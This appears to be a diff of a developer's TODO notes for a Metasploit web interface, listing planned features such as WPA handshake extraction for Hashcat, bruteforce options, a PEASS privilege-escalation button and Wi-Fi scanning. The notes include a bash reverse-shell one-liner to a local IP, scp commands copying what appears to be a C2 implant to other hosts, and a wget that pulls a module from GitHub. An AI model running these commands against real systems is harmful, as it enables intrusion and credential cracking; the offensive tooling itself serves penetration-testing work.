@@ -13,17 +13,12 @@ cd ~/Documents/GitHub/Msf-Web-Interface/backend && go run .
 ?? Diagramatic of the project network, 
 inlcuding colour coding for compromised hosts.
 
+extract WPA/WPA2 handshakes from .pcap or .pcapng capture files and convert them into Hashcat-compatible .22000 files and Aircrack-ng .hccap files for password cracking.
+
 !!!! Within the shells panel, the list of sessions needs to persist when moving
 away from that tab or page
 
-?? The overview link should be to the hosts project folder
-
-Firewalls and scans, searchsploit
-
-SQLMap
-Dirb
-hashcat pipeline
-bruteforce logins
+Include option for URL in Bruteforce, default to current targeted host ip if already assigned
 
 sudo -l
 sudo: a terminal is required to read the password; either use the -S option to read from standard input
@@ -35,9 +30,28 @@ sudo: a password is required
 I want to incorporate Linpeas and PEASS to be runnable dependent on OS detected,
 the results from these scans are filtered for useful information to include in the report
 
+I need a Peas button in post exploitation
+ that will background the current session and run use post/multi/gather/peass in msf.
+
+On first run check if /usr/share/metasploit-framework/modules/post/multi/gather/peass.rb exsits and if not run 
+
+"sudo wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/metasploit/peass.rb -O /usr/share/metasploit-framework/modules/post/multi/gather/peass.rb"
+before running use post/multi/gather/peass in msf.
+
+The ouput is then saved as loot, with filtering to show important info only.
+
+/tmp/msf-handshakes/Beautiful2_eeea9ef21b9e.pcap
+
 rewrite the README.md and QUICKSTART.md to reflect the current version
 
+=====================================
+
 Add Useful command examples 
+
+https://github.com/stealthsploit/OneRuleToRuleThemStill/blob/main/OneRuleToRuleThemStill.rule
+
+nano /home/kali/.local/share/hashcat/hashcat.potfile
+
 
 Rev Shell
 0<&196;exec 196<>/dev/tcp/192.168.0.17/4444; sh <&196 >&196 2>&196
@@ -47,3 +61,16 @@ scp -r ~/Payloads/Bash\ Scripts/pingsweep.sh master@192.168.0.11:/home/master
 
 scp -r demon.x64.exe  9422@192.168.0.173:/Users/9422/Downloads/
 
+sudo ifconfig wlan0 down  
+sudo iwconfig wlan0 mode managed
+sudo ifconfig wlan0 up
+sudo systemctl restart NetworkManager.service
+
+===================================================
+FWIP
+
+once in monitor mode I need the button to change to Disable Monitor Mode. Add a new button to scan for access points, 
+
+this should be displayed in a live updating
+view, the table should be first identified by the SSID with other columns labeled with BSSID, signal strength, clients etc,
+intially with the strongest signaled access point first but with the abilty to reorder all columns.
